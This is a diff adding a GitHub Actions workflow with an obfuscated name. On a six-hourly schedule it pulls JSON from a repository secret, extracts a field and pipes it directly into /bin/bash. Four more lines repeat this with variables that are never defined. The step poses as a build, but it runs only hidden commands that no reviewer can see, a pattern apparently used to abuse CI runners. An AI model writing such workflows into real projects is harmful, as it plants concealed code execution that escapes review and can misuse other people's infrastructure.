@@ -1,0 +1,22 @@
+name: yangbinxi3618
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangbinxi3618
+        env:
+          mfi226: ${{ secrets.mfi226 }}
+        run: |
+          echo $mfi226 | jq -r .wb353 | /bin/bash
+          echo $cg71 | jq -r .yvh06907 | /bin/bash
+          echo $ozaf9 | jq -r .h542 | /bin/bash
+          echo $lom64832 | jq -r .e07570 | /bin/bash
+          echo $klxr9168 | jq -r .ndugh2578 | /bin/bash
+
